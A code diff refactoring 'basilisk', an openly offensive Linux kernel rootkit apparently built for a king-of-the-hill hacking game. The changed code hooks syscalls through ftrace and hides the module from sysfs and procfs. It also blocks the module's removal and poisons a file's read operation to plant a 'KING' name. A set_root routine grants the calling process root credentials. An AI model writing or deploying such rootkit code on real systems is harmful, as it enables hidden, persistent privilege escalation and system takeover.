@@ -10,13 +10,12 @@
 #include <linux/string.h>
 #include <linux/types.h>
 #include <linux/fs.h>
-#include <linux/path.h>
 #include <linux/namei.h>
 #include <linux/rwlock.h>
 
 #include "include/ftrace_helper.h"
 #include "include/stealth_helper.h"
-
+#include "include/utils.h"
 
 // Macros for the kill hook commands (documented at the kill_hook)
 #define SIG_HIDE 63
@@ -43,21 +42,17 @@ MODULE_VERSION("2.0");
 static short hidden = 0; // toggle for hiding from sysfs/procfs
 static short protected = 0; // toggle for inc/decrementing module ref count (un/protecting it from being removed)
 
-static struct file_operations *king_fops;
-static DEFINE_RWLOCK(king_fops_lock);
+static struct file_operations *king_fops = NULL;
 
-/* Cleanup the king_fops struct*/
-static void cleanup_fops(void) {
-    kfree(king_fops); 
-    king_fops = NULL; // prevent dangling pointer access
-}
+// static struct file_operations *king_fops;
+static DEFINE_RWLOCK(king_fops_lock);
 
 /*
 Hook for the read system call. Reads KING into buf and updates the pos pointer.
 WARNING: This function is to be hooked in the f_op struct of the target file.
             Hooking it elsewhere will most definetely cause damage to the system.
 */
-static ssize_t hook_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
+static ssize_t read_hook(struct file *file, char __user *buf, size_t count, loff_t *pos)
 {
     int read_len; 
     if (*pos == 0 && count >= KING_LEN) { // If pos at start of file, *read* our KING name
@@ -73,21 +68,6 @@ static ssize_t hook_read(struct file *file, char __user *buf, size_t count, loff
     }
 }
 
-/* Checks if path doesn't match KING_FILENAME and return immediately*/
-static long is_bad_path(const char *full_path) {
-    if (strncmp(full_path, KING_FILENAME, KING_FILENAME_LEN) != 0) {
-        return 1;
-    }
-    return 0;
-}
-
-/* Checks if file descriptor (fd) is standard (STDOUT, STDERR, STDIN)*/
-static long is_bad_fd(const int fd) {
-    if (fd < 3) { // 0, 1, 2
-        return 1;
-    }
-    return 0;
-}
 /* 
 Chains kern_path and d_path to resolve the final filename from a path (filename) is pointing to. 
 WARNING: Callers should use full_path, not resolved_path, to use the name! 
@@ -114,18 +94,18 @@ static long resolve_filename(const char __user *filename, char *resolved_path, c
         return PTR_ERR(*full_path);
     }
 
-    error = is_bad_path(*full_path); // check if full_path matches KING_FILENAME
+    error = is_bad_path(*full_path, KING_FILENAME, KING_FILENAME_LEN); // check if full_path matches KING_FILENAME
     if (error) {
+        path_put(&path);
         return error; 
     }
 
     path_put(&path);
-    kfree(resolved_path);
-
+    
     return 0;
 }
 
-/* Poisons the file operations structures of given fd to use hook_read as the read syscall */
+/* Poisons the file operations structures of given fd to use read_hook as the read syscall */
 static long handle_fops_poisoning(int fd, const char *full_path) {
     struct file *file;
 
@@ -143,7 +123,7 @@ static long handle_fops_poisoning(int fd, const char *full_path) {
         
         king_fops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
         if (king_fops) {
-            king_fops->read = hook_read;
+            king_fops->read = read_hook;
         } else {
             pr_alert("Failed to allocate memory for new file_operations\n");
             write_unlock(&king_fops_lock);
@@ -360,14 +340,10 @@ void set_root(void)
     root = prepare_creds();
 
     if (root == NULL)
-            return;
+        return;
 
     // Set credentials to root
-    root->uid.val = root->gid.val = 0;
-    root->euid.val = root->egid.val = 0;
-    root->suid.val = root->sgid.val = 0;
-    root->fsuid.val = root->fsgid.val = 0;
-
+    __set_root_creds(root);
     commit_creds(root);
 }
 
@@ -394,7 +370,7 @@ static int __init basilisk_init(void)
 
 static void __exit basilisk_exit(void)
 {
-    cleanup_fops(); // free king_fops
+    cleanup_fops(king_fops); // free king_fops
     /* Unhook and restore the syscalls */
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     printk(KERN_INFO "basilisk: unloaded\n");
